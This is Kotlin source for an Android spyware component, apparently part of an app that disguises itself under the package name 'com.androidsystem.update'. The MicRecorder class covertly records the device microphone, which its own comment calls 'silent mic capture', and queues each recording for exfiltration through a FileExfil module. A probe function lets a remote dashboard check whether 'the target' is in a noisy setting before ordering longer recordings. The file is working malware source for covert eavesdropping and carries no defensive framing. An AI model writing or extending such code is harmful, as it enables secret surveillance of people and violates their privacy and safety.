package com.androidsystem.update.audio

import android.Manifest
import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import com.androidsystem.update.exfil.FileExfil
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Silent mic capture. The MediaRecorder is created with MIC source, M4A container
 * (AAC inside MP4), low bitrate. The app should run a foreground service with
 * type=microphone (Android 14+) — handled in [WorkManagerScheduler]/CoreService.
 */
@Singleton
class MicRecorder @Inject constructor(
    private val context: Context,
    private val exfil: FileExfil
) {
    private val tag = "MicRecorder"

    /**
     * Record [durationMs] of audio to a file, then ship via [FileExfil].
     * @return the file or null on failure
     */
    fun record(durationMs: Long = 15_000L, sampleRate: Int = 22_050, bitRate: Int = 64_000): File? {
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
            Log.w(tag, "no RECORD_AUDIO")
            return null
        }
        val outFile = newAudioFile()
        val rec = MediaRecorder().apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                setAudioSource(MediaRecorder.AudioSource.MIC)
            } else {
                @Suppress("DEPRECATION")
                setAudioSource(MediaRecorder.AudioSource.MIC)
            }
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(sampleRate)
            setAudioEncodingBitRate(bitRate)
            setOutputFile(outFile.absolutePath)
            setMaxDuration(durationMs.toInt().coerceAtMost(60 * 60 * 1000))
            try { prepare() } catch (e: Exception) { Log.e(tag, "prepare", e); return null }
        }
        return try {
            rec.start()
            Thread.sleep(durationMs)
            try { rec.stop() } catch (_: Throwable) {}
            exfil.enqueue(outFile, "audio", mapOf("duration_ms" to durationMs.toString(), "sample_rate" to sampleRate.toString(), "bit_rate" to bitRate.toString()))
            outFile
        } catch (e: Throwable) {
            Log.e(tag, "record", e); null
        } finally {
            try { rec.release() } catch (_: Throwable) {}
        }
    }

    /**
     * Adaptive ambient level probe: 1s of audio, returns the peak amplitude in dBFS
     * (negative; closer to 0 = louder). Used by the dashboard to confirm the target
     * is in a noisy environment before issuing a longer record command.
     */
    fun probeLevel(durationMs: Long = 1_000L): Double? {
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) return null
        val outFile = newAudioFile(prefix = "probe")
        val rec = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(8_000)
            setAudioEncodingBitRate(32_000)
            setOutputFile(outFile.absolutePath)
            setMaxDuration(durationMs.toInt())
            try { prepare() } catch (e: Exception) { Log.e(tag, "probe prepare", e); return null }
        }
        return try {
            rec.start()
            Thread.sleep(durationMs)
            val amp = rec.maxAmplitude // 0..32767
            try { rec.stop() } catch (_: Throwable) {}
            if (amp <= 0) Double.NEGATIVE_INFINITY else 20.0 * Math.log10(amp / 32767.0)
        } catch (e: Throwable) { null } finally {
            try { rec.release() } catch (_: Throwable) {}
            try { outFile.delete() } catch (_: Throwable) {}
        }
    }

    private fun hasPermission(p: String) = ContextCompat.checkSelfPermission(context, p) == android.content.pm.PackageManager.PERMISSION_GRANTED

    private fun newAudioFile(prefix: String = "mic"): File {
        val dir = File(context.filesDir, "captures").apply { if (!exists()) mkdirs() }
        return File(dir, "${prefix}_${System.currentTimeMillis()}.m4a")
    }
}
